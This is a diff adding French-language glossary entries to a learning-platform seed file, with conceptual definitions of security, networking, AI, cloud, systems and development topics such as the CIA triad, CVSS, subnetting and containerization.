@@ -44,6 +44,7 @@ const SKILLS: { key: string; name: string; category: SkillCategory }[] = [
 
   // Cybersecurity (suite)
   { key: "red-team-fundamentals", name: "Red Team Fundamentals", category: "CYBERSECURITY" },
+  { key: "blue-team-fundamentals", name: "Blue Team Fundamentals", category: "CYBERSECURITY" },
 
   // AI (suite)
   { key: "prompt-engineering", name: "Prompt Engineering", category: "AI" },
@@ -954,6 +955,502 @@ const CONCEPTS: ConceptSeed[] = [
     relatedKeys: ["xss", "cors"],
     prerequisiteKeys: ["xss"],
     aliases: ["content security policy"],
+  },
+  {
+    key: "cia-triad",
+    name: "CIA Triad",
+    category: "CYBERSECURITY",
+    level: 1,
+    definition:
+      "Le modèle fondamental de la sécurité de l'information : Confidentialité, Intégrité, Disponibilité (Confidentiality, Integrity, Availability) — les trois propriétés qu'une mesure de sécurité cherche à protéger.",
+    explanationBeginner:
+      "Confidentialité : seules les personnes autorisées voient la donnée. Intégrité : la donnée n'est pas altérée sans autorisation. Disponibilité : la donnée/service reste accessible quand on en a besoin. Presque toute décision de sécurité peut se rattacher à l'une de ces trois propriétés.",
+    explanationAdvanced:
+      "Ces trois propriétés sont souvent en tension : chiffrer des données protège la confidentialité mais peut réduire la disponibilité (clé perdue = données inaccessibles). Une attaque DDoS cible uniquement la disponibilité sans toucher confidentialité ni intégrité. Le modèle sert de grille de lecture pour classer une menace ou évaluer une contre-mesure : « quelle propriété protège-t-elle réellement ? »",
+    docUrl: "https://www.cisa.gov/news-events/news/cia-triad",
+    relatedKeys: ["threat-modeling", "cvss"],
+    prerequisiteKeys: [],
+    aliases: ["confidentialite integrite disponibilite", "cid"],
+  },
+  {
+    key: "threat-modeling",
+    name: "Threat Modeling",
+    category: "CYBERSECURITY",
+    level: 2,
+    definition:
+      "Une démarche structurée pour identifier, à l'avance, les menaces possibles sur un système avant de le construire ou de le modifier, plutôt que de réagir après une attaque.",
+    explanationBeginner:
+      "Avant de coder une fonctionnalité, se poser des questions comme « qui pourrait vouloir attaquer ça ? », « par où pourrait-il rentrer ? », « que se passe-t-il si ça échoue ? » — anticiper coûte bien moins cher que de corriger une faille découverte en production.",
+    explanationAdvanced:
+      "Des méthodologies structurées existent, comme STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) qui catégorise systématiquement les types de menaces à envisager pour chaque composant d'une architecture. Le threat modeling se fait idéalement dès la conception (« shift left »), pas après le déploiement.",
+    docUrl: "https://owasp.org/www-community/Threat_Modeling",
+    relatedKeys: ["attack-surface", "cia-triad"],
+    prerequisiteKeys: [],
+    aliases: ["modelisation de menaces"],
+  },
+  {
+    key: "attack-surface",
+    name: "Attack Surface",
+    category: "CYBERSECURITY",
+    level: 2,
+    definition:
+      "L'ensemble des points d'entrée par lesquels un attaquant pourrait tenter de compromettre un système : endpoints d'API exposés, formulaires, ports ouverts, dépendances tierces, comptes utilisateurs.",
+    explanationBeginner:
+      "Plus une application expose de fonctionnalités, de ports réseau ou de dépendances externes, plus sa surface d'attaque est grande — chaque point exposé est une porte potentielle à sécuriser. Réduire la surface d'attaque (désactiver ce qui n'est pas utilisé) est une des mesures de sécurité les plus simples et efficaces.",
+    explanationAdvanced:
+      "La surface d'attaque inclut aussi la supply chain : chaque dépendance tierce (paquet npm/pip, image Docker de base) est un vecteur potentiel si elle est compromise, même sans faille dans le code propre à l'application. Un audit de surface d'attaque liste systématiquement tous les points d'entrée exposés, y compris ceux jugés « internes » mais accessibles depuis un réseau partiellement compromis.",
+    docUrl: "https://owasp.org/www-community/Attack_Surface_Analysis_Cheat_Sheet",
+    relatedKeys: ["threat-modeling", "supply-chain-attack"],
+    prerequisiteKeys: [],
+    aliases: ["surface d'attaque"],
+  },
+  {
+    key: "cve",
+    name: "CVE",
+    category: "CYBERSECURITY",
+    level: 2,
+    definition:
+      "Common Vulnerabilities and Exposures — un identifiant public standardisé (ex: CVE-2024-12345) attribué à chaque vulnérabilité connue et publiquement documentée, pour la référencer sans ambiguïté.",
+    explanationBeginner:
+      "Quand une faille de sécurité est découverte dans un logiciel largement utilisé, elle reçoit un numéro CVE unique — ça permet à tout le monde (chercheurs, éditeurs, administrateurs) de parler exactement de la même vulnérabilité, sans confusion, et de suivre facilement si un système y est exposé.",
+    explanationAdvanced:
+      "Une CVE décrit *quelle* vulnérabilité existe, mais pas *à quel point* elle est grave — c'est le rôle du score CVSS associé. La base MITRE CVE est la référence historique ; NVD (National Vulnerability Database) l'enrichit avec le scoring CVSS et des métadonnées. Un scan de vulnérabilités compare les versions de logiciels installés à la base CVE pour repérer les composants exposés à une faille connue.",
+    docUrl: "https://cve.mitre.org/",
+    relatedKeys: ["cvss", "vulnerability-vs-exploit"],
+    prerequisiteKeys: [],
+    aliases: ["common vulnerabilities and exposures"],
+  },
+  {
+    key: "cvss",
+    name: "CVSS",
+    category: "CYBERSECURITY",
+    level: 3,
+    definition:
+      "Common Vulnerability Scoring System — un score standardisé de 0 à 10 qui évalue la gravité d'une vulnérabilité, permettant de prioriser les correctifs.",
+    explanationBeginner:
+      "Toutes les vulnérabilités ne se valent pas : certaines nécessitent un accès physique à la machine pour être exploitées, d'autres sont exploitables à distance sans authentification. Le score CVSS traduit cette gravité en un chiffre unique (0 = négligeable, 10 = critique) pour aider à décider quoi corriger en priorité.",
+    explanationAdvanced:
+      "Le calcul se base sur plusieurs métriques : vecteur d'attaque (réseau, local, physique), complexité d'exploitation, privilèges requis, interaction utilisateur nécessaire, et impact sur confidentialité/intégrité/disponibilité (la CIA Triad). Un score élevé combiné à une exploitation triviale à distance sans authentification représente typiquement le niveau de priorité de correction le plus urgent.",
+    docUrl: "https://www.first.org/cvss/",
+    relatedKeys: ["cve", "cia-triad"],
+    prerequisiteKeys: ["cve"],
+    aliases: ["common vulnerability scoring system"],
+  },
+  {
+    key: "privilege-escalation",
+    name: "Privilege Escalation",
+    category: "CYBERSECURITY",
+    level: 3,
+    definition:
+      "Une technique par laquelle un attaquant, déjà présent sur un système avec des accès limités, obtient des privilèges plus élevés que ceux initialement accordés.",
+    explanationBeginner:
+      "Un attaquant qui a réussi à accéder à un compte utilisateur normal cherche ensuite à devenir administrateur/root — c'est l'élévation de privilèges. C'est presque toujours la deuxième étape d'une attaque, après l'accès initial.",
+    explanationAdvanced:
+      "On distingue l'élévation verticale (obtenir un niveau de privilège supérieur, ex: user → root) de l'élévation horizontale (accéder aux ressources d'un autre utilisateur de même niveau). Les vecteurs classiques incluent des permissions de fichiers mal configurées, des services tournant avec des privilèges excessifs, ou des vulnérabilités logicielles non corrigées — le principe du moindre privilège est la contre-mesure structurelle principale.",
+    docUrl: "https://owasp.org/www-community/attacks/Privilege_escalation",
+    relatedKeys: ["least-privilege-principle", "attack-surface"],
+    prerequisiteKeys: [],
+    aliases: ["elevation de privileges"],
+  },
+  {
+    key: "buffer-overflow",
+    name: "Buffer Overflow",
+    category: "CYBERSECURITY",
+    level: 4,
+    definition:
+      "Une vulnérabilité où un programme écrit plus de données dans une zone mémoire (buffer) que sa capacité allouée, débordant sur la mémoire adjacente — historiquement l'une des failles les plus exploitées.",
+    explanationBeginner:
+      "Imagine une boîte prévue pour 10 objets dans laquelle on en force 15 : les 5 en trop débordent sur l'espace voisin. En mémoire, ce débordement peut écraser des données importantes (ou même du code exécutable), qu'un attaquant peut exploiter pour détourner l'exécution du programme.",
+    explanationAdvanced:
+      "Historiquement fréquent en C/C++ (langages à gestion manuelle de la mémoire, sans vérification automatique des bornes d'un tableau). Un buffer overflow bien exploité peut permettre l'exécution de code arbitraire en écrasant l'adresse de retour d'une fonction sur la pile. Les langages modernes avec gestion mémoire automatique (JavaScript, Python, Rust) éliminent cette classe de vulnérabilité par construction — Rust va plus loin en garantissant la sécurité mémoire sans garbage collector, via son système d'ownership.",
+    docUrl: "https://owasp.org/www-community/vulnerabilities/Buffer_Overflow",
+    relatedKeys: ["rust"],
+    prerequisiteKeys: [],
+    aliases: ["debordement de tampon"],
+  },
+  {
+    key: "phishing",
+    name: "Phishing",
+    category: "CYBERSECURITY",
+    level: 1,
+    definition:
+      "Une technique d'ingénierie sociale où un attaquant se fait passer pour une entité légitime (banque, service RH, collègue) pour tromper une victime et lui faire révéler des informations sensibles ou cliquer sur un lien malveillant.",
+    explanationBeginner:
+      "Un email « urgent » prétendant venir de ta banque, te demandant de cliquer sur un lien pour « vérifier ton compte » avant qu'il ne soit bloqué, est un exemple classique de phishing — l'objectif est de créer de l'urgence pour court-circuiter la réflexion.",
+    explanationAdvanced:
+      "Le spear phishing cible une personne précise avec des informations personnalisées (récoltées via OSINT) pour paraître plus crédible ; le whaling cible spécifiquement des cadres dirigeants. Les indicateurs techniques classiques incluent un domaine d'expéditeur légèrement différent de l'officiel (typosquatting), des liens dont l'URL réelle diffère du texte affiché, et une pression temporelle artificielle — mais aucune formation ne rend une organisation totalement immunisée, d'où l'importance de contrôles techniques complémentaires (MFA, filtrage anti-spam).",
+    docUrl: "https://www.cisa.gov/topics/cyber-threats-and-advisories/phishing",
+    relatedKeys: ["social-engineering", "mfa"],
+    prerequisiteKeys: [],
+    aliases: ["hameconnage"],
+  },
+  {
+    key: "rbac",
+    name: "RBAC",
+    category: "CYBERSECURITY",
+    level: 2,
+    definition:
+      "Role-Based Access Control — un modèle de contrôle d'accès où les permissions sont attribuées à des rôles (ex: « admin », « éditeur », « lecteur »), et les utilisateurs héritent des permissions du rôle qui leur est assigné.",
+    explanationBeginner:
+      "Plutôt que de configurer les permissions individuellement pour chaque utilisateur, on définit des rôles avec un ensemble de permissions cohérent, puis on assigne chaque utilisateur à un ou plusieurs rôles — beaucoup plus simple à gérer et à auditer à grande échelle.",
+    explanationAdvanced:
+      "RBAC s'oppose à l'ABAC (Attribute-Based Access Control), plus flexible car basé sur des attributs contextuels (heure, localisation, département) plutôt que sur des rôles fixes, mais plus complexe à raisonner et auditer. RBAC reste le modèle par défaut recommandé pour la majorité des cas grâce à sa simplicité — il s'aligne naturellement avec le principe du moindre privilège quand les rôles sont bien découpés.",
+    docUrl: "https://en.wikipedia.org/wiki/Role-based_access_control",
+    relatedKeys: ["least-privilege-principle"],
+    prerequisiteKeys: [],
+    aliases: ["role based access control", "controle d'acces base sur les roles"],
+  },
+  {
+    key: "hashing",
+    name: "Hashing",
+    category: "CYBERSECURITY",
+    level: 2,
+    definition:
+      "Une fonction mathématique à sens unique qui transforme une donnée de taille arbitraire en une empreinte de taille fixe — utilisée pour stocker des mots de passe sans jamais les garder en clair.",
+    explanationBeginner:
+      "Un bon algorithme de hash produit toujours la même empreinte pour la même entrée, mais il est pratiquement impossible de retrouver l'entrée d'origine à partir de l'empreinte seule — c'est pourquoi on stocke le hash d'un mot de passe, jamais le mot de passe lui-même.",
+    explanationAdvanced:
+      "Le hashing diffère du chiffrement (réversible avec la bonne clé) : un hash n'est jamais censé être « dé-hashé ». Pour les mots de passe spécifiquement, des algorithmes lents et adaptatifs (bcrypt, Argon2, scrypt) sont préférés à des hash rapides génériques (SHA-256, MD5) précisément parce que leur lenteur intentionnelle ralentit une attaque par force brute — un hash rapide facilite au contraire les attaques massives. Le salage (salting) empêche l'utilisation de tables précalculées (rainbow tables).",
+    docUrl: "https://owasp.org/www-community/Password_Storage_Cheat_Sheet",
+    relatedKeys: ["salting-purpose", "brute-force-attack"],
+    prerequisiteKeys: [],
+    aliases: ["hachage"],
+  },
+  {
+    key: "waf",
+    name: "WAF",
+    category: "CYBERSECURITY",
+    level: 3,
+    definition:
+      "Web Application Firewall — un pare-feu spécialisé placé devant une application web, qui filtre le trafic HTTP en analysant le contenu des requêtes (pas seulement les ports/IP comme un pare-feu réseau classique) pour bloquer des attaques connues.",
+    explanationBeginner:
+      "Un WAF inspecte le contenu réel des requêtes web (paramètres, en-têtes, corps) pour détecter des tentatives d'injection SQL, de XSS ou d'autres patterns d'attaque connus, et les bloquer avant qu'elles n'atteignent l'application — une couche de protection supplémentaire, pas un remplacement d'un code sécurisé.",
+    explanationAdvanced:
+      "Un WAF fonctionne généralement sur un modèle de règles (signatures d'attaques connues) ou un modèle comportemental (détection d'anomalies par rapport à un trafic habituel) — parfois les deux combinés. Un WAF n'est pas une solution miracle : il complète, sans jamais remplacer, une application déjà codée de façon sécurisée (requêtes paramétrées, échappement systématique) — un WAF seul peut être contourné par des variantes d'attaque non couvertes par ses règles.",
+    docUrl: "https://owasp.org/www-community/Web_Application_Firewall",
+    relatedKeys: ["sql-injection", "xss"],
+    prerequisiteKeys: [],
+    aliases: ["web application firewall", "pare-feu applicatif"],
+  },
+  {
+    key: "osi-model",
+    name: "Modèle OSI",
+    category: "NETWORKING",
+    level: 2,
+    definition:
+      "Open Systems Interconnection — un modèle conceptuel à 7 couches qui décrit comment les données circulent d'une application à travers le réseau jusqu'à une autre application, chaque couche ayant une responsabilité précise.",
+    explanationBeginner:
+      "De haut en bas : Application (le logiciel), Présentation (format des données), Session (gestion de la connexion), Transport (TCP/UDP), Réseau (IP, routage), Liaison (adressage MAC local), Physique (câbles, signaux). Chaque couche ne se préoccupe que de son propre rôle, sans savoir comment les autres fonctionnent.",
+    explanationAdvanced:
+      "Le modèle OSI est surtout pédagogique aujourd'hui — l'implémentation réelle d'internet suit plutôt le modèle TCP/IP à 4 couches, plus simple. Comprendre à quelle couche appartient un protocole aide à diagnostiquer un problème réseau : un problème DNS est applicatif (couche 7), un câble débranché est physique (couche 1), un souci de routage est réseau (couche 3) — savoir où chercher accélère énormément le diagnostic.",
+    docUrl: "https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/",
+    relatedKeys: ["tcp-vs-udp", "http"],
+    prerequisiteKeys: [],
+    aliases: ["osi", "modele osi 7 couches"],
+  },
+  {
+    key: "subnetting",
+    name: "Subnetting",
+    category: "NETWORKING",
+    level: 3,
+    definition:
+      "La technique qui divise un réseau IP en sous-réseaux (subnets) plus petits, pour organiser le trafic, isoler des groupes de machines et utiliser plus efficacement l'espace d'adresses disponible.",
+    explanationBeginner:
+      "Plutôt qu'un seul énorme réseau plat où toutes les machines se voient directement, on le découpe en sous-réseaux plus petits (par service, par étage, par département) — ça limite la portée d'un incident et facilite la gestion du trafic.",
+    explanationAdvanced:
+      "Le masque de sous-réseau (ex: `/24` = 255.255.255.0) détermine combien de bits de l'adresse IP identifient le réseau vs l'hôte — plus le préfixe est grand (`/28` par exemple), plus le sous-réseau est petit en nombre d'adresses disponibles. Le CIDR (Classless Inter-Domain Routing) a remplacé l'ancien système de classes fixes (A/B/C) pour permettre un découpage bien plus flexible et économe en adresses.",
+    docUrl: "https://www.cloudflare.com/learning/network-layer/what-is-a-subnet/",
+    relatedKeys: ["ip-private-range", "nat"],
+    prerequisiteKeys: [],
+    aliases: ["sous-reseau", "cidr"],
+  },
+  {
+    key: "nat",
+    name: "NAT",
+    category: "NETWORKING",
+    level: 2,
+    definition:
+      "Network Address Translation — la technique qui permet à plusieurs machines d'un réseau privé de partager une seule adresse IP publique pour communiquer sur internet.",
+    explanationBeginner:
+      "Ta box internet a une seule adresse IP publique, mais tous tes appareils (téléphone, ordinateur, TV connectée) ont chacun une adresse privée différente sur ton réseau local — le NAT traduit et route le trafic entre ces adresses privées et l'unique adresse publique partagée.",
+    explanationAdvanced:
+      "Le NAT à état (stateful) garde une table de correspondance entre les connexions sortantes (IP privée + port) et l'IP/port publics utilisés, pour router correctement les réponses entrantes vers la bonne machine interne. C'est aussi, incidemment, une forme légère de sécurité par obscurité : les machines internes ne sont pas directement adressables depuis l'extérieur sans configuration explicite (port forwarding).",
+    docUrl: "https://www.cloudflare.com/learning/network-layer/what-is-nat/",
+    relatedKeys: ["ip-private-range", "subnetting"],
+    prerequisiteKeys: [],
+    aliases: ["network address translation", "traduction d'adresse reseau"],
+  },
+  {
+    key: "firewall",
+    name: "Pare-feu (Firewall)",
+    category: "NETWORKING",
+    level: 1,
+    definition:
+      "Un système qui filtre le trafic réseau entrant/sortant selon un ensemble de règles prédéfinies, pour bloquer les communications non autorisées.",
+    explanationBeginner:
+      "Un pare-feu agit comme un videur à l'entrée d'un club : il vérifie chaque paquet réseau selon une liste de règles (« ce port est autorisé », « cette IP est bloquée ») et décide de le laisser passer ou de le rejeter.",
+    explanationAdvanced:
+      "Un pare-feu réseau classique filtre sur les en-têtes (IP source/destination, port, protocole) sans regarder le contenu applicatif — c'est le rôle d'un WAF pour le trafic web spécifiquement. Les pare-feux stateful gardent en mémoire l'état des connexions établies pour n'autoriser que les réponses légitimes à une connexion sortante déjà initiée, contrairement aux pare-feux stateless plus anciens qui évaluent chaque paquet isolément.",
+    docUrl: "https://www.cloudflare.com/learning/security/what-is-a-firewall/",
+    relatedKeys: ["waf", "vpn"],
+    prerequisiteKeys: [],
+    aliases: ["pare feu"],
+  },
+  {
+    key: "machine-learning",
+    name: "Machine Learning",
+    category: "AI",
+    level: 1,
+    definition:
+      "Une branche de l'intelligence artificielle où un système apprend à reconnaître des patterns à partir de données, plutôt que d'être programmé avec des règles explicites pour chaque cas.",
+    explanationBeginner:
+      "Au lieu d'écrire des règles « si X alors Y » pour chaque situation, on montre au système des milliers d'exemples (données d'entraînement) et il apprend lui-même à généraliser un pattern — comme reconnaître un chat sur une photo sans qu'on ait défini manuellement « ce qu'est » visuellement un chat.",
+    explanationAdvanced:
+      "On distingue l'apprentissage supervisé (données étiquetées avec la bonne réponse attendue), non supervisé (le modèle trouve seul des structures/clusters sans étiquette) et par renforcement (le modèle apprend par essai-erreur via un système de récompense). Le deep learning est un sous-domaine du ML basé sur des réseaux de neurones à plusieurs couches, à l'origine des progrès récents en vision par ordinateur et en traitement du langage (dont les LLM).",
+    docUrl: "https://www.ibm.com/topics/machine-learning",
+    relatedKeys: ["llm", "supervised-learning-def"],
+    prerequisiteKeys: [],
+    aliases: ["apprentissage automatique", "ml"],
+  },
+  {
+    key: "vector-database",
+    name: "Base de données vectorielle",
+    category: "AI",
+    level: 3,
+    definition:
+      "Une base de données optimisée pour stocker et rechercher des embeddings (représentations vectorielles) par similarité, plutôt que par correspondance exacte comme une base SQL classique.",
+    explanationBeginner:
+      "Une base classique retrouve une ligne par correspondance exacte (« WHERE id = 5 »). Une base vectorielle retrouve plutôt les éléments les plus « proches » sémantiquement d'une requête donnée — utile pour du RAG, où on cherche les extraits de documentation les plus pertinents pour une question, même sans mot-clé exact en commun.",
+    explanationAdvanced:
+      "La recherche par similarité (souvent cosine similarity ou distance euclidienne) sur de très grands volumes de vecteurs utilise des index approximatifs (ANN — Approximate Nearest Neighbor, ex: HNSW) plutôt qu'une comparaison exhaustive, pour rester performante à grande échelle. Nodify utilise volontairement une recherche par mots-clés plus simple pour son système documentaire (voir docsService.ts), faute d'API d'embeddings publique exposée par le provider utilisé.",
+    docUrl: "https://www.pinecone.io/learn/vector-database/",
+    relatedKeys: ["rag", "embedding-def"],
+    prerequisiteKeys: ["machine-learning"],
+    aliases: ["vector db", "base vectorielle"],
+  },
+  {
+    key: "transformer-architecture",
+    name: "Architecture Transformer",
+    category: "AI",
+    level: 4,
+    definition:
+      "L'architecture de réseau de neurones (introduite en 2017) sur laquelle reposent la quasi-totalité des grands modèles de langage modernes (GPT, Claude, Gemini...), basée sur un mécanisme d'attention.",
+    explanationBeginner:
+      "Le Transformer permet à un modèle de « prêter attention » à différentes parties d'un texte simultanément pour comprendre le contexte d'un mot — contrairement aux architectures précédentes qui traitaient le texte séquentiellement, mot après mot, perdant plus facilement le contexte sur de longs textes.",
+    explanationAdvanced:
+      "Le mécanisme central est le « self-attention » : pour chaque mot (token), le modèle calcule un poids d'importance par rapport à tous les autres tokens du contexte, permettant de capturer des dépendances à longue distance efficacement, et en parallèle (contrairement aux RNN/LSTM séquentiels qui l'ont précédé). Ce parallélisme est aussi ce qui a rendu l'entraînement sur d'énormes volumes de données pratiquement réalisable.",
+    docUrl: "https://en.wikipedia.org/wiki/Transformer_(deep_learning_architecture)",
+    relatedKeys: ["llm", "tokenization"],
+    prerequisiteKeys: ["machine-learning"],
+    aliases: ["transformer", "self-attention"],
+  },
+  {
+    key: "infrastructure-as-code",
+    name: "Infrastructure as Code",
+    category: "CLOUD",
+    level: 2,
+    definition:
+      "La pratique de définir et gérer son infrastructure (serveurs, réseaux, bases de données) via des fichiers de configuration versionnés, plutôt qu'en cliquant manuellement dans une interface web.",
+    explanationBeginner:
+      "Au lieu de créer un serveur en cliquant dans une console cloud (étapes non reproductibles, non tracées), on décrit cette infrastructure dans un fichier texte versionné dans Git — reproductible, review-able comme du code, et facilement recréable à l'identique sur un autre environnement.",
+    explanationAdvanced:
+      "Terraform est l'outil le plus connu, avec une approche déclarative : on décrit l'état final voulu, l'outil calcule le diff avec l'état actuel et applique uniquement les changements nécessaires. L'IaC élimine la « configuration drift » (dérive de configuration) — le décalage progressif entre ce qui est documenté et ce qui tourne réellement en production, un problème classique de la gestion manuelle d'infrastructure.",
+    docUrl: "https://www.terraform.io/intro",
+    relatedKeys: ["terraform", "ci-cd"],
+    prerequisiteKeys: [],
+    aliases: ["iac"],
+  },
+  {
+    key: "auto-scaling",
+    name: "Auto-scaling",
+    category: "CLOUD",
+    level: 3,
+    definition:
+      "La capacité d'une infrastructure cloud à ajouter ou retirer automatiquement des ressources (serveurs, instances) en fonction de la charge réelle, sans intervention manuelle.",
+    explanationBeginner:
+      "Si le trafic d'un site explose soudainement (pic viral, soldes), l'auto-scaling déclenche automatiquement le démarrage de nouveaux serveurs pour absorber la charge — puis les retire automatiquement quand le trafic redescend, évitant de payer pour une capacité inutilisée en temps normal.",
+    explanationAdvanced:
+      "Le scaling horizontal (ajouter des instances) est généralement préféré au scaling vertical (augmenter la puissance d'une seule instance) en cloud, car il n'a pas de limite physique dure et permet une meilleure tolérance aux pannes (répartition sur plusieurs machines). Les règles d'auto-scaling se basent typiquement sur des métriques (CPU, mémoire, nombre de requêtes) avec des seuils de déclenchement — un mauvais réglage peut créer un effet de yo-yo (scaling up/down en boucle) s'il est trop réactif.",
+    docUrl: "https://aws.amazon.com/autoscaling/",
+    relatedKeys: ["load-balancer", "serverless"],
+    prerequisiteKeys: [],
+    aliases: ["mise a l'echelle automatique"],
+  },
+  {
+    key: "object-storage",
+    name: "Object Storage",
+    category: "CLOUD",
+    level: 2,
+    definition:
+      "Un service de stockage cloud (ex: AWS S3) qui stocke des fichiers comme des objets indépendants accessibles par une clé unique, plutôt que dans une hiérarchie de dossiers classique comme un système de fichiers traditionnel.",
+    explanationBeginner:
+      "Au lieu de stocker un fichier sur le disque d'un serveur précis (qui peut tomber en panne), l'object storage le distribue et le réplique automatiquement sur plusieurs machines/zones — le fichier reste accessible même si une partie de l'infrastructure tombe en panne, avec une durabilité bien supérieure à un disque classique.",
+    explanationAdvanced:
+      "Chaque objet est accompagné de métadonnées personnalisables et accessible via une simple URL/API HTTP, sans notion réelle de hiérarchie de dossiers (les « dossiers » affichés dans une interface S3 sont une simulation via des préfixes dans le nom de clé). Idéal pour du contenu statique à fort volume (images, backups, logs) mais pas adapté à des accès aléatoires fréquents avec verrouillage/écriture concurrente comme un vrai système de fichiers.",
+    docUrl: "https://aws.amazon.com/s3/",
+    relatedKeys: ["cdn"],
+    prerequisiteKeys: [],
+    aliases: ["stockage objet", "s3"],
+  },
+  {
+    key: "cpu-cache",
+    name: "Cache CPU",
+    category: "SYSTEMS",
+    level: 3,
+    definition:
+      "Une mémoire très rapide mais de petite taille, intégrée au processeur, qui garde une copie des données/instructions les plus récemment ou fréquemment utilisées pour éviter des accès plus lents à la RAM.",
+    explanationBeginner:
+      "Accéder à la RAM prend un temps significatif à l'échelle d'un processeur moderne — le cache CPU (organisé en niveaux L1/L2/L3, du plus petit/rapide au plus grand/lent) garde sous la main les données probablement réutilisées bientôt, accélérant énormément les traitements répétitifs.",
+    explanationAdvanced:
+      "Le principe de localité (temporelle : une donnée récemment utilisée le sera probablement encore bientôt ; spatiale : une donnée proche en mémoire d'une donnée utilisée le sera probablement aussi) guide les stratégies de préchargement du cache. Un « cache miss » (donnée absente du cache, nécessitant un accès RAM plus lent) impacte directement les performances — c'est une des raisons pour lesquelles l'ordre d'accès aux structures de données en mémoire (parcourir un tableau séquentiellement vs de façon éparpillée) peut avoir un impact mesurable sur la vitesse d'exécution.",
+    docUrl: "https://en.wikipedia.org/wiki/CPU_cache",
+    relatedKeys: ["ram-vs-disk-storage"],
+    prerequisiteKeys: [],
+    aliases: ["cache processeur"],
+  },
+  {
+    key: "virtual-memory",
+    name: "Mémoire virtuelle",
+    category: "SYSTEMS",
+    level: 3,
+    definition:
+      "Une technique du système d'exploitation qui donne à chaque programme l'illusion de disposer d'un espace mémoire continu et privé, indépendamment de la RAM physique réellement disponible.",
+    explanationBeginner:
+      "Chaque programme croit avoir accès à toute la mémoire de la machine pour lui seul — le système d'exploitation traduit en réalité cette « mémoire virtuelle » vers la RAM physique (partagée entre tous les programmes en cours), de façon totalement transparente pour le programme.",
+    explanationAdvanced:
+      "Quand la RAM physique disponible est insuffisante, le système peut déplacer temporairement des pages mémoire peu utilisées vers le disque (le swap) pour libérer de la RAM — beaucoup plus lent qu'un accès RAM direct, d'où le ralentissement perceptible d'une machine qui swappe intensément. La pagination (division en pages de taille fixe) est le mécanisme technique standard qui rend cette traduction virtuel→physique gérable, avec la MMU (Memory Management Unit) matérielle qui accélère cette traduction.",
+    docUrl: "https://en.wikipedia.org/wiki/Virtual_memory",
+    relatedKeys: ["swap-memory-purpose", "ram-vs-disk-storage"],
+    prerequisiteKeys: [],
+    aliases: ["memoire virtuelle"],
+  },
+  {
+    key: "boot-process",
+    name: "Processus de démarrage (Boot)",
+    category: "SYSTEMS",
+    level: 2,
+    definition:
+      "La séquence d'étapes qu'exécute un ordinateur entre sa mise sous tension et le chargement complet du système d'exploitation, prêt à l'utilisation.",
+    explanationBeginner:
+      "À l'allumage : le BIOS/UEFI (firmware intégré à la carte mère) se lance en premier, effectue des vérifications matérielles de base, puis localise et lance le chargeur de démarrage (bootloader), qui charge à son tour le noyau du système d'exploitation en mémoire.",
+    explanationAdvanced:
+      "UEFI a largement remplacé le BIOS historique sur le matériel récent, avec des avantages notables : support de disques plus grands (GPT plutôt que MBR), démarrage plus rapide, et Secure Boot — une vérification cryptographique de la signature du bootloader et du noyau avant de les exécuter, pour empêcher le chargement d'un composant de démarrage malveillant compromis.",
+    docUrl: "https://en.wikipedia.org/wiki/Booting",
+    relatedKeys: ["bios-uefi-role", "os-kernel-def"],
+    prerequisiteKeys: [],
+    aliases: ["demarrage", "boot"],
+  },
+  {
+    key: "containerization",
+    name: "Conteneurisation",
+    category: "SYSTEMS",
+    level: 2,
+    definition:
+      "Une technique d'isolation légère qui empaquette une application avec toutes ses dépendances dans un environnement portable (conteneur), en partageant le noyau du système hôte — contrairement à une machine virtuelle qui virtualise du matériel entier.",
+    explanationBeginner:
+      "Un conteneur (comme ceux créés par Docker) démarre en une fraction de seconde et consomme peu de ressources, car il ne réinvente pas un système d'exploitation complet comme le fait une machine virtuelle — il réutilise le noyau de la machine hôte tout en isolant les processus, fichiers et ressources réseau de l'application.",
+    explanationAdvanced:
+      "L'isolation d'un conteneur repose sur des fonctionnalités du noyau Linux : les namespaces (isolation de la vue — processus, réseau, système de fichiers — propre à chaque conteneur) et les cgroups (limitation des ressources CPU/mémoire allouées). Une machine virtuelle virtualise du matériel complet via un hyperviseur et fait tourner un noyau OS complet et séparé par VM — plus lourd, mais avec une isolation plus forte (utile quand on ne fait pas confiance du tout au code exécuté).",
+    docUrl: "https://www.docker.com/resources/what-container/",
+    relatedKeys: ["docker", "kubernetes"],
+    prerequisiteKeys: [],
+    aliases: ["containerisation", "conteneurs"],
+  },
+  {
+    key: "design-patterns",
+    name: "Design Patterns",
+    category: "DEVELOPMENT",
+    level: 3,
+    definition:
+      "Des solutions réutilisables et éprouvées à des problèmes de conception logicielle récurrents, formalisées avec un nom et un vocabulaire commun entre développeurs.",
+    explanationBeginner:
+      "Plutôt que de réinventer une solution à un problème déjà rencontré des milliers de fois par d'autres développeurs (« comment créer un seul objet partagé partout ? », « comment notifier plusieurs composants d'un changement ? »), les design patterns offrent un vocabulaire et une solution éprouvée — communiquer « on utilise un Observer ici » est bien plus rapide que de réexpliquer toute la structure.",
+    explanationAdvanced:
+      "Le livre fondateur (le « Gang of Four », 1994) classe les patterns en trois familles : créationnels (Factory, Singleton — comment créer des objets), structurels (Adapter, Decorator — comment composer des objets/classes), comportementaux (Observer, Strategy — comment les objets interagissent). Un piège fréquent chez les développeurs juniors est de forcer un pattern là où une solution simple suffirait — un pattern doit résoudre un vrai problème de conception, pas être appliqué par principe.",
+    docUrl: "https://refactoring.guru/design-patterns",
+    relatedKeys: ["clean-code"],
+    prerequisiteKeys: [],
+    aliases: ["patrons de conception"],
+  },
+  {
+    key: "clean-code",
+    name: "Clean Code",
+    category: "DEVELOPMENT",
+    level: 2,
+    definition:
+      "Un ensemble de principes visant à écrire du code lisible, compréhensible et maintenable par d'autres développeurs (ou soi-même dans 6 mois), pas seulement du code qui « fonctionne ».",
+    explanationBeginner:
+      "Un nom de variable explicite (`totalPrice` plutôt que `x`), une fonction qui ne fait qu'une seule chose clairement identifiable, des commentaires qui expliquent le « pourquoi » plutôt que de répéter le « quoi » évident du code — autant de pratiques simples qui rendent un code bien plus facile à reprendre plus tard.",
+    explanationAdvanced:
+      "Le principe DRY (Don't Repeat Yourself) évite la duplication de logique — mais peut être appliqué à l'excès, créant une abstraction prématurée pour une similarité superficielle entre deux bouts de code qui, en réalité, évolueront différemment. Le ratio « temps passé à lire du code existant » vs « temps passé à en écrire » est largement en faveur de la lecture dans un projet réel — d'où l'importance disproportionnée de la lisibilité par rapport à la rapidité d'écriture initiale.",
+    docUrl: "https://github.com/ryanmcdermott/clean-code-javascript",
